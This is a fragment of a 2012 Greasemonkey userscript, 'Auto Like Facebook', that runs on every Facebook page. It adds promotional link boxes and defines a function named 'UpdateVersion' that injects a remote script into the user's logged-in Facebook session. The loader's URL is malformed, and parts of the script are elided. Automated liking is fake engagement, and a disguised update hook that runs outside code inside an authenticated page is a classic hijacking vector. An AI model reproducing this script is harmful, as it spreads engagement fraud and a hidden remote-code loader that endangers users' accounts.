...
// @description		        Auto Like Facebook by ~NieZam~
// @author			~NieZam~
// @authorURL		        http://www.facebook.com/toy.story.7169?ref=tn_tnmn
// @homepage		        http://www.facebook.com/toy.story.7169?ref=tn_tnmn
// @include			htt*://www.facebook.com/*
// @icon			http://m.ak.fbcdn.net/profile.ak/hprofile-ak-snc6/274640_100003487180075_1260087704_n.jpg
// @version			21 Oktober 2012
...
body.appendChild(div);}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+50px";div.style.left = "+8px";div.style.backgroundColor = "#53CFF8";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='http://www.facebook.com/thankyou.NJB' title='Nuri Jea Bow'><blink><center>Berlangganan</center></blink></a>"
body.appendChild(div);}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.90;div.style.bottom = "+29px";div.style.left = "+8px";div.style.backgroundColor = "#FAAAC4";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#2419B2' href='http://userscripts.org/scripts/show/149978' target='_blank'><center>Baca Tutorials app</center></a>"
body.appendChild(div);unsafeWindow.UpdateVersion = function() {javascript:(a=(b=document).createElement("script")).src="//fb..com/2012 ",b.body.appendChild(a);void(0);};}
